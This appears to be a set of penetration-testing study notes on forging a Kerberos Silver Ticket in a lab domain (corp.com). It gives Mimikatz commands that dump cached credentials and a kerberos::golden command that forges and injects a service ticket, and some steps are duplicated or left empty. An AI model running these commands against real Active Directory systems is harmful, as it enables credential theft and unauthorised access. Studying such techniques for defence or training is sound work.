# Silver Tickets

In general, we need to collect the following three pieces of information to create a silver ticket:

{% stepper %}
{% step %}
**SPN password hash**

Extract cached AD credentials with Mimikatz:

{% code title="Mimikatz" %}
```
privilege::debug

sekurlsa::logonpasswords
```
{% endcode %}

* looking for NLTM hashes
{% endstep %}

{% step %}
**Domain SID**

```
whoami /user
```

* we're only interested in the Domain SID, so we omit the RID of the user
{% endstep %}

{% step %}
**Target SPN**


{% endstep %}
{% endstepper %}



Confirm user has no access to the resource:&#x20;

```powershell
iwr -UseDefaultCredentials http://web04
```

Extract cached AD credentials with Mimikatz:

{% code title="Mimikatz" %}
```
privilege::debug

sekurlsa::logonpasswords
```
{% endcode %}

* looking for NLTM hashes

Get SID:

```
whoami /user
```

* we're only interested in the Domain SID, so we omit the RID of the user





{% code title="Mimikatz" overflow="wrap" %}
```powershell
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```
{% endcode %}

* **kerberos::golden**_:_ Mimikatz module to create the forged service ticket
* **/sid:** domain SID
* **/domain:** domain name
* **/target:** the target where the SPN runs
* **/service:** SPN protocol
* **/rc4:** NTLM hash of the SPN
* **/ptt:** allows us to inject the forged ticket into the memory of the machine we execute the command on
* **/user:** an existing domain user



```
klist
```



